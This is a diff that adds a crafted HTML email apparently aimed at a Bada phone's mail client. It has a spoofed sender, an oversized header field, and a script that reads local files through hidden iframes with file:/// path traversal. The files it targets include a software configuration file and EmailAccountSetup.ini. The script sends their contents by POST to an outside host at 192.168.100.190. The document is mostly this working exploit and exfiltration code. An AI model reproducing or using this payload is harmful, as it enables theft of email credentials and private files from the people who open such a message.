@@ -1,0 +1,25 @@
+X-UID: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Subject: Crash My Bada v15.5
+From: billgates@microsoft.com
+To: ah@gmail.com
+Content-Type: text/html
+
+<script>
+    var timeout = 0;
+    function sendfile(f, t){
+        setTimeout(function(){
+            var a = new XMLHttpRequest();
+            a.open("POST", "http://192.168.100.190/file.php?"); // for some reason blocking XHRs don't work, use async and deal with it
+            var b = document.createElement("iframe")
+            b.src = "file:///User/../.."+f
+            b.style.width = 0;
+            b.style.height = 0;
+            b.onload = function(){a.send(new XMLSerializer().serializeToString(b.contentWindow.document));b.style.display="none"};
+            document.body.appendChild(b);
+        }, timeout)
+        timeout += t // because sT is async and i fucking hate async shit, and i want to solve it as simple as possible
+    }
+    sendfile("/CSC/SW_Configuration.xml", 1000);
+    sendfile("/Registry/EmailAccountSetup.ini", 1000);
+</script>
+.
